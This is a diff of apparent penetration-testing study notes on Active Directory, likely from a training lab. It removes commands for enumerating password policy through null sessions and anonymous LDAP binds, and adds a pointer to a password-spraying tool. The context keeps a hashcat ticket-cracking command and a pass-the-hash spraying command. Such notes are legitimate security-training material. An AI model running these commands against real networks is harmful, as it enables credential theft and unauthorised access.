@@ -42,32 +42,6 @@ hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
 |rpcclient|135/TCP|
 |smbclient|445/TCP|
 
-#### Enum Password Policy
-##### Using  Linux
-- rpcclient
-- CrackMapExec
-- enum4linux-ng
-
-__CrackMapExec__
-```bash
-crackmapexec smb $IP --pass-pol
-```
-```bash
-crackmapexec smb $IP -u avazquez -p Password123 --pass-pol
-```
-
-__SMB NULL Session__
-```shell-session
-rpcclient -U "" -N $IP
-rpcclient $> getdompwinfo
-```
-
-__LDAP Anonymous Bind__
-```bash
-ldapsearch -h $IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
-```
-
-
 ##### Using Windows
 __NULL Session__
 ```cmd
@@ -101,7 +75,7 @@ __Local Admin Spraying__
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
-
+[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
 
 ---
 ### BloodHound/SharpHound
